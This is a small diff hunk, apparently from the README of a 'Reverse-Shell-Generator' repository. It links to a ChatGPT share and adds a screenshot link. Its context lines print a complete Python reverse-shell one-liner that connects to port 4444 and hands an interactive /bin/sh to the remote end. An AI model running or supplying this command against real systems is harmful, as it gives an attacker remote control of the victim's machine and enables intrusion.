@@ -21,3 +21,6 @@ https://chatgpt.com/share/74ea2fe2-6b6d-400e-bfee-1a434763a162
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.0.0.0",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+
+![Screenshot 2024-06-08 015037](https://github.com/DevVj-1/Reverse-Shell-Generator/assets/106962581/13b0947b-d1bd-43af-bb1b-b9a2fc6063e2)
+
